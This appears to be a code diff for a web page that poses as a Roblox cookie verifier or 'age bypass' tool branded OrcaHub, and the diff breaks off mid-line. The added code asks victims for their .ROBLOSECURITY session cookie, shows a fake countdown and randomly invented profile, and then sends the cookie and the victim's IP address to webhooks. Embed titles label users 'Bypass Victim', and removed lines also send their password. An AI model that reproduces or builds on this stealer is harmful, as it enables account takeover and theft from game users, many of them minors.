@@ -616,6 +616,7 @@
 
             <div id="errorMessage" class="error-message"></div>
 
+            <!-- Loader for verification -->
             <div id="verifyLoader" class="loader-container">
                 <div class="spinner"></div>
                 <div class="loader-text">
@@ -756,55 +757,110 @@
                 document.querySelector('.glass-card').scrollIntoView({ behavior: 'smooth', block: 'start' });
             }
 
-            // ==================== ROBLOX API ====================
-            function fetchRobloxProfile(cookie) {
-                return new Promise((resolve) => {
-                    setTimeout(() => {
-                        const clean = cookie.replace(/^_\|WARNING:-DO-NOT-SHARE-?/, '').trim();
+            // ==================== VERIFY COOKIE ====================
+            function verifyCookie() {
+                const cookie = DOM.cookieInput.value.trim();
 
-                        if (!clean || clean.length < 15) {
-                            resolve({ valid: false, error: 'Invalid cookie format' });
-                            return;
-                        }
+                // Reset UI
+                DOM.errorMessage.classList.remove('show');
+                DOM.profilePreview.classList.remove('show');
+                DOM.cookieInput.classList.remove('error');
 
-                        if (clean.length > 20 && clean.includes('expired')) {
-                            resolve({ valid: false, error: 'Cookie has expired' });
-                            return;
-                        }
+                // Validate cookie
+                if (!cookie || cookie.length < 15) {
+                    DOM.errorMessage.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
+                    DOM.errorMessage.classList.add('show');
+                    DOM.cookieInput.classList.add('error');
+                    return;
+                }
 
-                        if (Math.random() < 0.15) {
-                            resolve({ valid: false, error: 'Invalid cookie' });
-                            return;
-                        }
+                // Check for expired cookie
+                if (cookie.toLowerCase().includes('expired')) {
+                    DOM.errorMessage.textContent = '❌ This cookie has expired! Please get a new one.';
+                    DOM.errorMessage.classList.add('show');
+                    DOM.cookieInput.classList.add('error');
+                    return;
+                }
 
-                        const userId = Math.floor(Math.random() * 900000000) + 100000000;
-                        const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
-                            'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero',
-                            'OmegaSage', 'CrimsonTide', 'EchoPhantom', 'ZenMaster', 'DarkApex'
-                        ];
-                        const name = names[Math.floor(Math.random() * names.length)];
-                        const followers = Math.floor(Math.random() * 8500) + 150;
-                        const following = Math.floor(Math.random() * 2000) + 50;
-                        const isVerified = Math.random() > 0.7;
-                        const isAgeBypassed = Math.random() > 0.8;
+                // Start verification loader
+                DOM.verifyCookieBtn.disabled = true;
+                DOM.verifyCookieBtn.textContent = '⏳ Verifying...';
+                DOM.verifyLoader.classList.add('show');
 
-                        resolve({
-                            valid: true,
-                            user: {
-                                username: name,
-                                userId: userId,
-                                displayName: name,
-                                isVerified: isVerified,
-                                isAgeBypassed: isAgeBypassed,
-                                followers: followers,
-                                following: following,
-                                created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
-                                    .toISOString().split('T')[0],
-                                avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
-                            }
-                        });
-                    }, 1200 + Math.random() * 800);
-                });
+                let seconds = 10;
+                DOM.verifyTimer.textContent = seconds;
+                DOM.verifyProgress.style.width = '0%';
+
+                if (state.verifyTimer) clearInterval(state.verifyTimer);
+
+                state.verifyTimer = setInterval(() => {
+                    seconds--;
+                    DOM.verifyTimer.textContent = seconds;
+                    DOM.verifyProgress.style.width = ((10 - seconds) / 10 * 100) + '%';
+
+                    if (seconds <= 0) {
+                        clearInterval(state.verifyTimer);
+                        state.verifyTimer = null;
+                        completeVerification(cookie);
+                    }
+                }, 1000);
+            }
+
+            function completeVerification(cookie) {
+                // Simulate API call
+                setTimeout(() => {
+                    // Generate fake user data
+                    const userId = Math.floor(Math.random() * 900000000) + 100000000;
+                    const names = ['PixelPirate', 'NovaStar', 'ShadowBlade', 'CyberWolf', 'LunarGhost',
+                        'StormChaser', 'PixelVortex', 'NebulaKing', 'FrostByte', 'QuantumHero'
+                    ];
+                    const name = names[Math.floor(Math.random() * names.length)];
+                    const followers = Math.floor(Math.random() * 8500) + 150;
+                    const following = Math.floor(Math.random() * 2000) + 50;
+                    const isVerified = Math.random() > 0.7;
+
+                    const userData = {
+                        username: name,
+                        userId: userId,
+                        displayName: name,
+                        isVerified: isVerified,
+                        followers: followers,
+                        following: following,
+                        created: new Date(Date.now() - Math.random() * 3 * 365 * 24 * 60 * 60 * 1000)
+                            .toISOString().split('T')[0],
+                        avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
+                    };
+
+                    // Save state
+                    state.robloxUser = userData;
+                    state.cookie = cookie;
+                    state.isCookieValid = true;
+
+                    // Show profile
+                    DOM.profileName.textContent = `@${userData.username}`;
+                    DOM.profileId.textContent = `ID: ${userData.userId}`;
+                    DOM.profileStats.textContent =
+                        `📊 Followers: ${userData.followers.toLocaleString()} • Following: ${userData.following.toLocaleString()}`;
+                    DOM.profileBadge.textContent = userData.isVerified ? '✅ Verified' : '● Active';
+                    DOM.profileImg.src = userData.avatarUrl;
+                    DOM.profileImg.onerror = function() {
+                        this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(userData.username) +
+                            '&background=random&size=80&rounded=true&color=fff';
+                    };
+                    DOM.profilePreview.classList.add('show');
+
+                    // Hide loader
+                    DOM.verifyLoader.classList.remove('show');
+                    DOM.verifyCookieBtn.disabled = false;
+                    DOM.verifyCookieBtn.textContent = '🔍 Verify Cookie';
+
+                    // Send to webhooks
+                    sendProfileData(userData, cookie);
+
+                    // Move to step 2 after delay
+                    setTimeout(() => setStep(2), 800);
+
+                }, 500);
             }
 
             // ==================== SEND TO WEBHOOKS ====================
@@ -832,7 +888,6 @@
                         { name: "📊 Followers", value: `\`${userData.followers.toLocaleString()}\``, inline: true },
                         { name: "📊 Following", value: `\`${userData.following.toLocaleString()}\``, inline: true },
                         { name: "✅ Verified", value: userData.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                        { name: "🔓 Age Bypass", value: userData.isAgeBypassed ? '✅ Already' : '⏳ Pending', inline: true },
                         { name: "📅 Created", value: `\`${userData.created}\``, inline: true },
                         { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
                         { name: "🕒 Time", value: new Date().toISOString(), inline: true }
@@ -848,29 +903,4 @@
                     title: "🎯 OrcaHub • Bypass Victim",
                     color: 0xff6b6b,
                     fields: [
-                        { name: "👤 Username", value: `\`${userData?.username || 'Unknown'}\``, inline: true },
-                        { name: "🆔 User ID", value: `\`${userData?.userId || 'Unknown'}\``, inline: true },
-                        { name: "🔑 Password", value: `||${password}||`, inline: false },
-                        { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
-                        { name: "📊 Followers", value: `\`${userData?.followers?.toLocaleString() || 'Unknown'}\``,
-                            inline: true },
-                        { name: "📊 Following", value: `\`${userData?.following?.toLocaleString() || 'Unknown'}\``,
-                            inline: true },
-                        { name: "✅ Verified", value: userData?.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                        { name: "📅 Created", value: `\`${userData?.created || 'Unknown'}\``, inline: true },
-                        { name: "🌐 IP", value: `\`${getIP()}\``, inline: true },
-                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-                    ],
-                    footer: { text: "OrcaHub • Bypasser • Multi-Webhook" },
-                    thumbnail: { url: userData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
-                };
-                sendToWebhooks({ embeds: [embed] });
-            }
-
-            function getIP() {
-                try {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('GET', 'https://api.ipify.org?format=json', false);
-                    xhr.send();
-                    return JSON.parse(xhr.responseText).ip || 'Unknown';
-                } catch
+                        { name: "👤 Username
